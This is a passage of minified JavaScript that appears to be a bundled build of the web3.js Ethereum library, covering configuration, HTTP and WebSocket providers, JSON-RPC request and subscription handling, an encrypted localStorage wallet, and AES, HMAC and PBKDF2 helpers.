            }
            off(e, t) {
                this._emitter.off(e, t)
            }
            emit(e, t) {
                this._emitter.emit(e, t)
            }
            listenerCount(e) {
                return this._emitter.listenerCount(e)
            }
            listeners(e) {
                return this._emitter.listeners(e)
            }
            eventNames() {
                return this._emitter.eventNames()
            }
            removeAllListeners() {
                return this._emitter.removeAllListeners()
            }
            setMaxListenerWarningThreshold(e) {
                this._emitter.setMaxListeners(e)
            }
            getMaxListeners() {
                return this._emitter.getMaxListeners()
            }
        }
        var ml;
        ! function(e) {
            e.CONFIG_CHANGE = "CONFIG_CHANGE"
        }(ml || (ml = {}));
        class gl extends pl {
            constructor(e) {
                super(), this.config = {
                    handleRevert: !1,
                    defaultAccount: void 0,
                    defaultBlock: "latest",
                    transactionBlockTimeout: 50,
                    transactionConfirmationBlocks: 24,
                    transactionPollingInterval: 1e3,
                    transactionPollingTimeout: 75e4,
                    transactionReceiptPollingInterval: void 0,
                    transactionSendTimeout: 75e4,
                    transactionConfirmationPollingInterval: void 0,
                    blockHeaderTimeout: 10,
                    maxListenersWarningThreshold: 100,
                    contractDataInputFill: "data",
                    defaultNetworkId: void 0,
                    defaultChain: "mainnet",
                    defaultHardfork: "london",
                    defaultCommon: void 0,
                    defaultTransactionType: "0x2",
                    defaultMaxPriorityFeePerGas: Hs(25e8),
                    enableExperimentalFeatures: {
                        useSubscriptionWhenCheckingBlockTimeout: !1,
                        useRpcCallSpecification: !1
                    },
                    transactionBuilder: void 0,
                    transactionTypeParser: void 0,
                    defaultReturnFormat: Xe
                }, this.setConfig(null !== e && void 0 !== e ? e : {})
            }
            setConfig(e) {
                const t = Object.keys(e);
                for (const n of t) this._triggerConfigChange(n, e[n]);
                Object.assign(this.config, e)
            }
            get handleRevert() {
                return this.config.handleRevert
            }
            set handleRevert(e) {
                this._triggerConfigChange("handleRevert", e), this.config.handleRevert = e
            }
            get contractDataInputFill() {
                return this.config.contractDataInputFill
            }
            set contractDataInputFill(e) {
                this._triggerConfigChange("contractDataInputFill", e), this.config.contractDataInputFill = e
            }
            get defaultAccount() {
                return this.config.defaultAccount
            }
            set defaultAccount(e) {
                this._triggerConfigChange("defaultAccount", e), this.config.defaultAccount = e
            }
            get defaultBlock() {
                return this.config.defaultBlock
            }
            set defaultBlock(e) {
                this._triggerConfigChange("defaultBlock", e), this.config.defaultBlock = e
            }
            get transactionSendTimeout() {
                return this.config.transactionSendTimeout
            }
            set transactionSendTimeout(e) {
                this._triggerConfigChange("transactionSendTimeout", e), this.config.transactionSendTimeout = e
            }
            get transactionBlockTimeout() {
                return this.config.transactionBlockTimeout
            }
            set transactionBlockTimeout(e) {
                this._triggerConfigChange("transactionBlockTimeout", e), this.config.transactionBlockTimeout = e
            }
            get transactionConfirmationBlocks() {
                return this.config.transactionConfirmationBlocks
            }
            set transactionConfirmationBlocks(e) {
                this._triggerConfigChange("transactionConfirmationBlocks", e), this.config.transactionConfirmationBlocks = e
            }
            get transactionPollingInterval() {
                return this.config.transactionPollingInterval
            }
            set transactionPollingInterval(e) {
                this._triggerConfigChange("transactionPollingInterval", e), this.config.transactionPollingInterval = e, this.transactionReceiptPollingInterval = e, this.transactionConfirmationPollingInterval = e
            }
            get transactionPollingTimeout() {
                return this.config.transactionPollingTimeout
            }
            set transactionPollingTimeout(e) {
                this._triggerConfigChange("transactionPollingTimeout", e), this.config.transactionPollingTimeout = e
            }
            get transactionReceiptPollingInterval() {
                return this.config.transactionReceiptPollingInterval
            }
            set transactionReceiptPollingInterval(e) {
                this._triggerConfigChange("transactionReceiptPollingInterval", e), this.config.transactionReceiptPollingInterval = e
            }
            get transactionConfirmationPollingInterval() {
                return this.config.transactionConfirmationPollingInterval
            }
            set transactionConfirmationPollingInterval(e) {
                this._triggerConfigChange("transactionConfirmationPollingInterval", e), this.config.transactionConfirmationPollingInterval = e
            }
            get blockHeaderTimeout() {
                return this.config.blockHeaderTimeout
            }
            set blockHeaderTimeout(e) {
                this._triggerConfigChange("blockHeaderTimeout", e), this.config.blockHeaderTimeout = e
            }
            get enableExperimentalFeatures() {
                return this.config.enableExperimentalFeatures
            }
            set enableExperimentalFeatures(e) {
                this._triggerConfigChange("enableExperimentalFeatures", e), this.config.enableExperimentalFeatures = e
            }
            get maxListenersWarningThreshold() {
                return this.config.maxListenersWarningThreshold
            }
            set maxListenersWarningThreshold(e) {
                this._triggerConfigChange("maxListenersWarningThreshold", e), this.setMaxListenerWarningThreshold(e), this.config.maxListenersWarningThreshold = e
            }
            get defaultReturnFormat() {
                return this.config.defaultReturnFormat
            }
            set defaultReturnFormat(e) {
                this._triggerConfigChange("defaultReturnFormat", e), this.config.defaultReturnFormat = e
            }
            get defaultNetworkId() {
                return this.config.defaultNetworkId
            }
            set defaultNetworkId(e) {
                this._triggerConfigChange("defaultNetworkId", e), this.config.defaultNetworkId = e
            }
            get defaultChain() {
                return this.config.defaultChain
            }
            set defaultChain(e) {
                if (!cc(this.config.defaultCommon) && !cc(this.config.defaultCommon.baseChain) && e !== this.config.defaultCommon.baseChain) throw new cr(this.config.defaultChain, e);
                this._triggerConfigChange("defaultChain", e), this.config.defaultChain = e
            }
            get defaultHardfork() {
                return this.config.defaultHardfork
            }
            set defaultHardfork(e) {
                if (!cc(this.config.defaultCommon) && !cc(this.config.defaultCommon.hardfork) && e !== this.config.defaultCommon.hardfork) throw new sr(this.config.defaultCommon.hardfork, e);
                this._triggerConfigChange("defaultHardfork", e), this.config.defaultHardfork = e
            }
            get defaultCommon() {
                return this.config.defaultCommon
            }
            set defaultCommon(e) {
                if (!cc(this.config.defaultHardfork) && !cc(e) && !cc(e.hardfork) && this.config.defaultHardfork !== e.hardfork) throw new sr(this.config.defaultHardfork, e.hardfork);
                if (!cc(this.config.defaultChain) && !cc(e) && !cc(e.baseChain) && this.config.defaultChain !== e.baseChain) throw new cr(this.config.defaultChain, e.baseChain);
                this._triggerConfigChange("defaultCommon", e), this.config.defaultCommon = e
            }
            get defaultTransactionType() {
                return this.config.defaultTransactionType
            }
            set defaultTransactionType(e) {
                this._triggerConfigChange("defaultTransactionType", e), this.config.defaultTransactionType = e
            }
            get defaultMaxPriorityFeePerGas() {
                return this.config.defaultMaxPriorityFeePerGas
            }
            set defaultMaxPriorityFeePerGas(e) {
                this._triggerConfigChange("defaultMaxPriorityFeePerGas", e), this.config.defaultMaxPriorityFeePerGas = e
            }
            get transactionBuilder() {
                return this.config.transactionBuilder
            }
            set transactionBuilder(e) {
                this._triggerConfigChange("transactionBuilder", e), this.config.transactionBuilder = e
            }
            get transactionTypeParser() {
                return this.config.transactionTypeParser
            }
            set transactionTypeParser(e) {
                this._triggerConfigChange("transactionTypeParser", e), this.config.transactionTypeParser = e
            }
            _triggerConfigChange(e, t) {
                this.emit(ml.CONFIG_CHANGE, {
                    name: e,
                    oldValue: this.config[e],
                    newValue: t
                })
            }
        }
        var vl = n(411),
            yl = function(e, t, n, r) {
                return new(n || (n = Promise))((function(i, o) {
                    function a(e) {
                        try {
                            c(r.next(e))
                        } catch (Qy) {
                            o(Qy)
                        }
                    }

                    function s(e) {
                        try {
                            c(r.throw(e))
                        } catch (Qy) {
                            o(Qy)
                        }
                    }

                    function c(e) {
                        var t;
                        e.done ? i(e.value) : (t = e.value, t instanceof n ? t : new n((function(e) {
                            e(t)
                        }))).then(a, s)
                    }
                    c((r = r.apply(e, t || [])).next())
                }))
            };
        class bl extends ot {
            constructor(e, t) {
                if (super(), !bl.validateClientUrl(e)) throw new nn(e);
                this.clientUrl = e, this.httpProviderOptions = t
            }
            static validateClientUrl(e) {
                return "string" === typeof e && /^http(s)?:\/\//i.test(e)
            }
            getStatus() {
                throw new Jt
            }
            supportsSubscriptions() {
                return !1
            }
            request(e, t) {
                var n;
                return yl(this, void 0, void 0, (function*() {
                    const r = Object.assign(Object.assign({}, null === (n = this.httpProviderOptions) || void 0 === n ? void 0 : n.providerOptions), t),
                        i = yield vl(this.clientUrl, Object.assign(Object.assign({}, r), {
                            method: "POST",
                            headers: Object.assign(Object.assign({}, r.headers), {
                                "Content-Type": "application/json"
                            }),
                            body: JSON.stringify(e)
                        }));
                    if (!i.ok) throw new or(yield i.json());
                    return yield i.json()
                }))
            }
            on() {
                throw new Jt
            }
            removeListener() {
                throw new Jt
            }
            once() {
                throw new Jt
            }
            removeAllListeners() {
                throw new Jt
            }
            connect() {
                throw new Jt
            }
            disconnect() {
                throw new Jt
            }
            reset() {
                throw new Jt
            }
            reconnect() {
                throw new Jt
            }
        }
        var wl = null;
        "undefined" !== typeof WebSocket ? wl = WebSocket : "undefined" !== typeof MozWebSocket ? wl = MozWebSocket : "undefined" !== typeof n.g ? wl = n.g.WebSocket || n.g.MozWebSocket : "undefined" !== typeof window ? wl = window.WebSocket || window.MozWebSocket : "undefined" !== typeof self && (wl = self.WebSocket || self.MozWebSocket);
        const xl = wl;
        class Al extends hl {
            constructor(e, t, n) {
                super(e, t, n)
            }
            _validateProviderPath(e) {
                return "string" === typeof e && /^ws(s)?:\/\//i.test(e)
            }
            getStatus() {
                if (this._socketConnection && !cc(this._socketConnection)) switch (this._socketConnection.readyState) {
                    case this._socketConnection.CONNECTING:
                        return "connecting";
                    case this._socketConnection.OPEN:
                        return "connected";
                    default:
                        return "disconnected"
                }
                return "disconnected"
            }
            _openSocketConnection() {
                this._socketConnection = new xl(this._socketPath, void 0, this._socketOptions && 0 === Object.keys(this._socketOptions).length ? void 0 : this._socketOptions)
            }
            _closeSocketConnection(e, t) {
                var n;
                null === (n = this._socketConnection) || void 0 === n || n.close(e, t)
            }
            _sendToSocket(e) {
                var t;
                if ("disconnected" === this.getStatus()) throw new Ft;
                null === (t = this._socketConnection) || void 0 === t || t.send(JSON.stringify(e))
            }
            _parseResponses(e) {
                return this.chunkResponseParser.parseResponse(e.data)
            }
            _addSocketListeners() {
                var e, t, n, r;
                null === (e = this._socketConnection) || void 0 === e || e.addEventListener("open", this._onOpenHandler), null === (t = this._socketConnection) || void 0 === t || t.addEventListener("message", this._onMessageHandler), null === (n = this._socketConnection) || void 0 === n || n.addEventListener("close", (e => this._onCloseHandler(e))), null === (r = this._socketConnection) || void 0 === r || r.addEventListener("error", this._onErrorHandler)
            }
            _removeSocketListeners() {
                var e, t, n;
                null === (e = this._socketConnection) || void 0 === e || e.removeEventListener("message", this._onMessageHandler), null === (t = this._socketConnection) || void 0 === t || t.removeEventListener("open", this._onOpenHandler), null === (n = this._socketConnection) || void 0 === n || n.removeEventListener("close", this._onCloseHandler)
            }
            _onCloseEvent(e) {
                var t;
                !this._reconnectOptions.autoReconnect || [1e3, 1001].includes(e.code) && e.wasClean ? (this._clearQueues(e), this._removeSocketListeners(), this._onDisconnect(e.code, e.reason), null === (t = this._socketConnection) || void 0 === t || t.removeEventListener("error", this._onErrorHandler)) : this._reconnect()
            }
        }
        const kl = e => ot.isWeb3Provider(e),
            El = e => "string" !== typeof e && "request" in e && "Function" === e.request.constructor.name,
            Sl = e => "string" !== typeof e && "request" in e && "AsyncFunction" === e.request.constructor.name,
            Cl = e => "string" !== typeof e && "send" in e,
            _l = e => "string" !== typeof e && "sendAsync" in e,
            Il = e => e && (kl(e) || Sl(e) || El(e) || _l(e) || Cl(e));
        var Pl, Tl = function(e, t, n, r) {
            return new(n || (n = Promise))((function(i, o) {
                function a(e) {
                    try {
                        c(r.next(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function s(e) {
                    try {
                        c(r.throw(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function c(e) {
                    var t;
                    e.done ? i(e.value) : (t = e.value, t instanceof n ? t : new n((function(e) {
                        e(t)
                    }))).then(a, s)
                }
                c((r = r.apply(e, t || [])).next())
            }))
        };
        ! function(e) {
            e.PROVIDER_CHANGED = "PROVIDER_CHANGED", e.BEFORE_PROVIDER_CHANGE = "BEFORE_PROVIDER_CHANGE"
        }(Pl || (Pl = {}));
        const Bl = {
            HttpProvider: bl,
            WebsocketProvider: Al
        };
        class Nl extends pl {
            constructor(e, t, n) {
                super(), cc(e) || this.setProvider(e), this.useRpcCallSpecification = t, cc(n) || (this.middleware = n)
            }
            static get providers() {
                return Bl
            }
            get provider() {
                return this._provider
            }
            get providers() {
                return Bl
            }
            setProvider(e) {
                let t;
                if (e && "string" === typeof e && this.providers)
                    if (/^http(s)?:\/\//i.test(e)) t = new this.providers.HttpProvider(e);
                    else {
                        if (!/^ws(s)?:\/\//i.test(e)) throw new tn("Can't autodetect provider for \"".concat(e, '"'));
                        t = new this.providers.WebsocketProvider(e)
                    }
                else t = cc(e) ? void 0 : e;
                return this.emit(Pl.BEFORE_PROVIDER_CHANGE, this._provider), this._provider = t, this.emit(Pl.PROVIDER_CHANGED, this._provider), !0
            }
            setMiddleware(e) {
                this.middleware = e
            }
            send(e) {
                return Tl(this, void 0, void 0, (function*() {
                    const t = Object.assign({}, e);
                    let n = yield this._sendRequest(t);
                    if (cc(this.middleware) || (n = yield this.middleware.processResponse(n)), Vc(n)) return n.result;
                    throw new or(n)
                }))
            }
            sendBatch(e) {
                return Tl(this, void 0, void 0, (function*() {
                    return yield this._sendRequest(e)
                }))
            }
            _sendRequest(e) {
                return Tl(this, void 0, void 0, (function*() {
                    const {
                        provider: t
                    } = this;
                    if (cc(t)) throw new tn("Provider not available. Use `.setProvider` or `.provider=` to initialize the provider.");
                    let n = il(e) ? rl(e) : nl(e);
                    if (cc(this.middleware) || (n = yield this.middleware.processRequest(n)), kl(t)) {
                        let e;
                        try {
                            e = yield t.request(n)
                        } catch (r) {
                            e = r
                        }
                        return this._processJsonRpcResponse(n, e, {
                            legacy: !1,
                            error: !1
                        })
                    }
                    if (Sl(t)) return t.request(n).then((e => this._processJsonRpcResponse(n, e, {
                        legacy: !0,
                        error: !1
                    }))).catch((e => this._processJsonRpcResponse(n, e, {
                        legacy: !0,
                        error: !0
                    })));
                    if (El(t)) return new Promise(((e, r) => {
                        const i = e => {
                                r(this._processJsonRpcResponse(n, e, {
                                    legacy: !0,
                                    error: !0
                                }))
                            },
                            o = t => e(this._processJsonRpcResponse(n, t, {
                                legacy: !0,
                                error: !1
                            })),
                            a = t.request(n, ((e, t) => e ? i(e) : o(t)));
                        if (Dc(a)) {
                            a.then(o).catch((e => {
                                try {
                                    const t = this._processJsonRpcResponse(n, e, {
                                        legacy: !0,
                                        error: !0
                                    });
                                    r(t)
                                } catch (t) {
                                    r(t)
                                }
                            }))
                        }
                    }));
                    if (Cl(t)) return new Promise(((e, r) => {
                        t.send(n, ((t, i) => {
                            if (t) return r(this._processJsonRpcResponse(n, t, {
                                legacy: !0,
                                error: !0
                            }));
                            if (cc(i)) throw new or({}, 'Got a "nullish" response from provider.');
                            return e(this._processJsonRpcResponse(n, i, {
                                legacy: !0,
                                error: !1
                            }))
                        }))
                    }));
                    if (_l(t)) return t.sendAsync(n).then((e => this._processJsonRpcResponse(n, e, {
                        legacy: !0,
                        error: !1
                    }))).catch((e => this._processJsonRpcResponse(n, e, {
                        legacy: !0,
                        error: !0
                    })));
                    throw new tn("Provider does not have a request or send method to use.")
                }))
            }
            _processJsonRpcResponse(e, t, n) {
                let {
                    legacy: r,
                    error: i
                } = n;
                if (cc(t)) return this._buildResponse(e, null, i);
                if (Zc(t)) {
                    if (this.useRpcCallSpecification && Wc(t)) {
                        const e = t;
                        if (hr.get(e.error.code)) {
                            throw new(0, hr.get(e.error.code).error)(e)
                        }
                        throw new dr(e)
                    }
                    if (!Nl._isReverted(t)) throw new ar(t, e)
                }
                if (Vc(t)) return t;
                if (t instanceof Error) throw Nl._isReverted(t), t;
                if (!r && il(e) && $c(t)) return t;
                if (r && !i && il(e)) return t;
                if (r && i && il(e)) throw t;
                if (r && !Zc(t) && !Vc(t)) return this._buildResponse(e, t, i);
                if (il(e) && !Array.isArray(t)) throw new or(t, "Got normal response for a batch request.");
                if (!il(e) && Array.isArray(t)) throw new or(t, "Got batch response for a normal request.");
                throw new or(t, "Invalid response")
            }
            static _isReverted(e) {
                let t;
                if (Zc(e) ? t = e.error : e instanceof Error && (t = e), null === t || void 0 === t ? void 0 : t.message.includes("revert")) throw new qt(t);
                return !1
            }
            _buildResponse(e, t, n) {
                const r = {
                    jsonrpc: "2.0",
                    id: il(e) ? e[0].id : "id" in e ? e.id : null
                };
                return n ? Object.assign(Object.assign({}, r), {
                    error: t
                }) : Object.assign(Object.assign({}, r), {
                    result: t
                })
            }
        }
        var Ol = function(e, t, n, r) {
            return new(n || (n = Promise))((function(i, o) {
                function a(e) {
                    try {
                        c(r.next(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function s(e) {
                    try {
                        c(r.throw(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function c(e) {
                    var t;
                    e.done ? i(e.value) : (t = e.value, t instanceof n ? t : new n((function(e) {
                        e(t)
                    }))).then(a, s)
                }
                c((r = r.apply(e, t || [])).next())
            }))
        };
        class Rl {
            constructor(e, t) {
                let n = arguments.length > 2 && void 0 !== arguments[2] && arguments[2];
                this.requestManager = e, this.registeredSubscriptions = t, this.tolerateUnlinkedSubscription = n, this._subscriptions = new Map, this.requestManager.on(Pl.BEFORE_PROVIDER_CHANGE, (() => Ol(this, void 0, void 0, (function*() {
                    yield this.unsubscribe()
                })))), this.requestManager.on(Pl.PROVIDER_CHANGED, (() => {
                    this.clear(), this.listenToProviderEvents()
                })), this.listenToProviderEvents()
            }
            listenToProviderEvents() {
                const e = this.requestManager.provider;
                this.requestManager.provider && ("function" !== typeof(null === e || void 0 === e ? void 0 : e.supportsSubscriptions) || (null === e || void 0 === e ? void 0 : e.supportsSubscriptions())) && "function" === typeof this.requestManager.provider.on && ("function" === typeof this.requestManager.provider.request ? this.requestManager.provider.on("message", (e => this.messageListener(e))) : e.on("data", (e => this.messageListener(e))))
            }
            messageListener(e) {
                var t, n, r;
                if (!e) throw new rn("Should not call messageListener with no data. Type was");
                const i = (null === (t = e.params) || void 0 === t ? void 0 : t.subscription) || (null === (n = e.data) || void 0 === n ? void 0 : n.subscription) || (null === (r = e.id) || void 0 === r ? void 0 : r.toString(16));
                if (i) {
                    const t = this._subscriptions.get(i);
                    null === t || void 0 === t || t.processSubscriptionData(e)
                }
            }
            subscribe(e, t) {
                let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : Xe;
                return Ol(this, void 0, void 0, (function*() {
                    const r = this.registeredSubscriptions[e];
                    if (!r) throw new rn("Invalid subscription type");
                    const i = new r(null !== t && void 0 !== t ? t : void 0, {
                        subscriptionManager: this,
                        returnFormat: n
                    });
                    return yield this.addSubscription(i), i
                }))
            }
            get subscriptions() {
                return this._subscriptions
            }
            addSubscription(e) {
                return Ol(this, void 0, void 0, (function*() {
                    if (!this.requestManager.provider) throw new tn("Provider not available");
                    if (!this.supportsSubscriptions()) throw new rn("The current provider does not support subscriptions");
                    if (e.id && this._subscriptions.has(e.id)) throw new rn('Subscription with id "'.concat(e.id, '" already exists'));
                    if (yield e.sendSubscriptionRequest(), cc(e.id)) throw new rn("Subscription is not subscribed yet.");
                    return this._subscriptions.set(e.id, e), e.id
                }))
            }
            removeSubscription(e) {
                return Ol(this, void 0, void 0, (function*() {
                    const {
                        id: t
                    } = e;
                    if (cc(t)) throw new rn("Subscription is not subscribed yet. Or, had already been unsubscribed but not through the Subscription Manager.");
                    if (!this._subscriptions.has(t) && !this.tolerateUnlinkedSubscription) throw new rn('Subscription with id "'.concat(t.toString(), '" does not exists'));
                    return yield e.sendUnsubscribeRequest(), this._subscriptions.delete(t), t
                }))
            }
            unsubscribe(e) {
                return Ol(this, void 0, void 0, (function*() {
                    const t = [];
                    for (const [n, r] of this.subscriptions.entries())(!e || "function" === typeof e && e({
                        id: n,
                        sub: r
                    })) && t.push(this.removeSubscription(r));
                    return Promise.all(t)
                }))
            }
            clear() {
                this._subscriptions.clear()
            }
            supportsSubscriptions() {
                return !cc(this.requestManager.provider) && ((e = this.requestManager.provider) && "supportsSubscriptions" in e ? e.supportsSubscriptions() : !(!e || "string" === typeof e || !("on" in e)));
                var e
            }
        }
        var Ml = function(e, t, n, r) {
            return new(n || (n = Promise))((function(i, o) {
                function a(e) {
                    try {
                        c(r.next(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function s(e) {
                    try {
                        c(r.throw(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function c(e) {
                    var t;
                    e.done ? i(e.value) : (t = e.value, t instanceof n ? t : new n((function(e) {
                        e(t)
                    }))).then(a, s)
                }
                c((r = r.apply(e, t || [])).next())
            }))
        };
        class jl extends pl {
            constructor(e, t) {
                var n;
                super(), this.args = e;
                const {
                    requestManager: r
                } = t, {
                    subscriptionManager: i
                } = t;
                this._subscriptionManager = r ? new Rl(r, {}, !0) : i, this._returnFormat = null !== (n = null === t || void 0 === t ? void 0 : t.returnFormat) && void 0 !== n ? n : Xe
            }
            get id() {
                return this._id
            }
            get lastBlock() {
                return this._lastBlock
            }
            subscribe() {
                return Ml(this, void 0, void 0, (function*() {
                    return this._subscriptionManager.addSubscription(this)
                }))
            }
            processSubscriptionData(e) {
                var t, n;
                (null === e || void 0 === e ? void 0 : e.data) ? this._processSubscriptionResult(null !== (n = null === (t = null === e || void 0 === e ? void 0 : e.data) || void 0 === t ? void 0 : t.result) && void 0 !== n ? n : null === e || void 0 === e ? void 0 : e.data): e && Kc(e) && this._processSubscriptionResult(null === e || void 0 === e ? void 0 : e.params.result)
            }
            sendSubscriptionRequest() {
                return Ml(this, void 0, void 0, (function*() {
                    return this._id = yield this._subscriptionManager.requestManager.send({
                        method: "eth_subscribe",
                        params: this._buildSubscriptionParams()
                    }), this.emit("connected", this._id), this._id
                }))
            }
            get returnFormat() {
                return this._returnFormat
            }
            get subscriptionManager() {
                return this._subscriptionManager
            }
            resubscribe() {
                return Ml(this, void 0, void 0, (function*() {
                    yield this.unsubscribe(), yield this.subscribe()
                }))
            }
            unsubscribe() {
                return Ml(this, void 0, void 0, (function*() {
                    this.id && (yield this._subscriptionManager.removeSubscription(this))
                }))
            }
            sendUnsubscribeRequest() {
                return Ml(this, void 0, void 0, (function*() {
                    yield this._subscriptionManager.requestManager.send({
                        method: "eth_unsubscribe",
                        params: [this.id]
                    }), this._id = void 0
                }))
            }
            formatSubscriptionResult(e) {
                return e
            }
            _processSubscriptionResult(e) {
                this.emit("data", this.formatSubscriptionResult(e))
            }
            _processSubscriptionError(e) {
                this.emit("error", e)
            }
            _buildSubscriptionParams() {
                throw new Error("Implement in the child class")
            }
        }
        var Fl = function(e, t, n, r) {
            return new(n || (n = Promise))((function(i, o) {
                function a(e) {
                    try {
                        c(r.next(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function s(e) {
                    try {
                        c(r.throw(e))
                    } catch (Qy) {
                        o(Qy)
                    }
                }

                function c(e) {
                    var t;
                    e.done ? i(e.value) : (t = e.value, t instanceof n ? t : new n((function(e) {
                        e(t)
                    }))).then(a, s)
                }
                c((r = r.apply(e, t || [])).next())
            }))
        };
        class Ll extends at {
            constructor() {
                super(...arguments), this._addressMap = new Map, this._defaultKeyName = "web3js_wallet"
            }
            static getStorage() {
                let e;
                try {
                    e = window.localStorage;
                    const t = "__storage_test__";
                    return e.setItem(t, t), e.removeItem(t), e
                } catch (Qy) {
                    return !Qy || 22 !== Qy.code && 1014 !== Qy.code && "QuotaExceededError" !== Qy.name && "NS_ERROR_DOM_QUOTA_REACHED" !== Qy.name || ss(e) || 0 === e.length ? void 0 : e
                }
            }
            create(e) {
                for (let t = 0; t < e; t += 1) this.add(this._accountProvider.create());
                return this
            }
            add(e) {
                var t;
                if ("string" === typeof e) return this.add(this._accountProvider.privateKeyToAccount(e));
                let n = this.length;
                return this.get(e.address) && (console.warn("Account ".concat(e.address.toLowerCase(), " already exists.")), n = null !== (t = this._addressMap.get(e.address.toLowerCase())) && void 0 !== t ? t : n), this._addressMap.set(e.address.toLowerCase(), n), this[n] = e, this
            }
            get(e) {
                if ("string" === typeof e) {
                    const t = this._addressMap.get(e.toLowerCase());
                    return ss(t) ? void 0 : this[t]
                }
                return this[e]
            }
            remove(e) {
                if ("string" === typeof e) {
                    const t = this._addressMap.get(e.toLowerCase());
                    return !ss(t) && (this._addressMap.delete(e.toLowerCase()), this.splice(t, 1), !0)
                }
                return !!this[e] && (this.splice(e, 1), !0)
            }
            clear() {
                return this._addressMap.clear(), this.length = 0, this
            }
            encrypt(e, t) {
                return Fl(this, void 0, void 0, (function*() {
                    return Promise.all(this.map((n => Fl(this, void 0, void 0, (function*() {
                        return n.encrypt(e, t)
                    })))))
                }))
            }
            decrypt(e, t, n) {
                return Fl(this, void 0, void 0, (function*() {
                    const r = yield Promise.all(e.map((e => Fl(this, void 0, void 0, (function*() {
                        return this._accountProvider.decrypt(e, t, n)
                    })))));
                    for (const e of r) this.add(e);
                    return this
                }))
            }
            save(e, t) {
                return Fl(this, void 0, void 0, (function*() {
                    const n = Ll.getStorage();
                    if (!n) throw new Error("Local storage not available.");
                    return n.setItem(null !== t && void 0 !== t ? t : this._defaultKeyName, JSON.stringify(yield this.encrypt(e))), !0
                }))
            }
            load(e, t) {
                return Fl(this, void 0, void 0, (function*() {
                    const n = Ll.getStorage();
                    if (!n) throw new Error("Local storage not available.");
                    const r = n.getItem(null !== t && void 0 !== t ? t : this._defaultKeyName);
                    return r && (yield this.decrypt(JSON.parse(r) || [], e)), this
                }))
            }
        }
        const Dl = {
            web: Nr
        };

        function Hl(e, t, n) {
            if (!n.startsWith("aes-")) throw new Error("AES submodule doesn't support mode ".concat(n));
            if (16 !== t.length) throw new Error("AES: wrong IV length");
            if (n.startsWith("aes-128") && 16 !== e.length || n.startsWith("aes-256") && 32 !== e.length) throw new Error("AES: wrong key length")
        }
        async function Ul(e, t, n) {
            if (!Dl.web) throw new Error("Browser crypto not available.");
            let r;
            if (["aes-128-cbc", "aes-256-cbc"].includes(e) && (r = "cbc"), ["aes-128-ctr", "aes-256-ctr"].includes(e) && (r = "ctr"), !r) throw new Error("AES: unsupported mode");
            return [await Dl.web.subtle.importKey("raw", t, {
                name: "AES-".concat(r.toUpperCase()),
                length: 8 * t.length
            }, !0, ["encrypt", "decrypt"]), {
                name: "aes-".concat(r),
                iv: n,
                counter: n,
                length: 128
            }]
        }
        async function zl(e, t, n) {
            let r = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : "aes-128-ctr",
                i = !(arguments.length > 4 && void 0 !== arguments[4]) || arguments[4];
            if (Hl(t, n, r), Dl.web) {
                const [o, a] = await Ul(r, t, n), s = await Dl.web.subtle.encrypt(a, o, e);
                let c = new Uint8Array(s);
                return i || "aes-cbc" !== a.name || e.length % 16 || (c = c.slice(0, -16)), c
            }
            if (Dl.node) {
                const o = Dl.node.createCipheriv(r, t, n);
                return o.setAutoPadding(i), Dr(o.update(e), o.final())
            }
            throw new Error("The environment doesn't have AES module")
        }
        async function Gl(e, t, n) {
            let r = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : "aes-128-ctr",
                i = !(arguments.length > 4 && void 0 !== arguments[4]) || arguments[4];
            if (Hl(t, n, r), Dl.web) {
                const [o, a] = await Ul(r, t, n);
                if (!i && "aes-cbc" === a.name) {
                    const i = await async function(e, t, n, r) {
                        const i = e.slice(-16);
                        for (let o = 0; o < 16; o++) i[o] ^= 16 ^ n[o];
                        return (await zl(i, t, n, r)).slice(0, 16)
                    }(e, t, n, r);
                    e = Dr(e, i)
                }
                const s = await Dl.web.subtle.decrypt(a, o, e),
                    c = new Uint8Array(s);
                if ("aes-cbc" === a.name) {
                    if (! function(e, t) {
                            if (e.length !== t.length) return !1;
                            for (let n = 0; n < e.length; n++)
                                if (e[n] !== t[n]) return !1;
                            return !0
                        }(await zl(c, t, n, r), e)) throw new Error("AES: wrong padding")
                }
                return c
            }
            if (Dl.node) {
                const o = Dl.node.createDecipheriv(r, t, n);
                return o.setAutoPadding(i), Dr(o.update(e), o.final())
            }
            throw new Error("The environment doesn't have AES module")
        }
        class ql extends Hr {
            constructor(e, t) {
                super(), this.finished = !1, this.destroyed = !1, vr(e);
                const n = Lr(t);
                if (this.iHash = e.create(), "function" !== typeof this.iHash.update) throw new Error("Expected instance of class which extends utils.Hash");
                this.blockLen = this.iHash.blockLen, this.outputLen = this.iHash.outputLen;
                const r = this.blockLen,
                    i = new Uint8Array(r);
                i.set(n.length > r ? e.create().update(n).digest() : n);
                for (let o = 0; o < i.length; o++) i[o] ^= 54;
                this.iHash.update(i), this.oHash = e.create();
                for (let o = 0; o < i.length; o++) i[o] ^= 106;
                this.oHash.update(i), i.fill(0)
            }
            update(e) {
                return yr(this), this.iHash.update(e), this
            }
            digestInto(e) {
                yr(this), gr(e, this.outputLen), this.finished = !0, this.iHash.digestInto(e), this.oHash.update(e), this.oHash.digestInto(e), this.destroy()
            }
            digest() {
                const e = new Uint8Array(this.oHash.outputLen);
                return this.digestInto(e), e
            }
            _cloneInto(e) {
                e || (e = Object.create(Object.getPrototypeOf(this), {}));
                const {
                    oHash: t,
                    iHash: n,
                    finished: r,
                    destroyed: i,
                    blockLen: o,
                    outputLen: a
                } = this;
                return e.finished = r, e.destroyed = i, e.blockLen = o, e.outputLen = a, e.oHash = t._cloneInto(e.oHash), e.iHash = n._cloneInto(e.iHash), e
            }
            destroy() {
                this.destroyed = !0, this.oHash.destroy(), this.iHash.destroy()
            }
        }
        const Ql = (e, t, n) => new ql(e, t).update(n).digest();

        function Wl(e, t, n, r) {
            vr(e);
            const i = zr({
                    dkLen: 32,
                    asyncTick: 10
                }, r),
                {
                    c: o,
                    dkLen: a,
                    asyncTick: s
                } = i;
            if (mr(o), mr(a), mr(s), o < 1) throw new Error("PBKDF2: iterations (c) should be >= 1");
            const c = Lr(t),
                l = Lr(n),
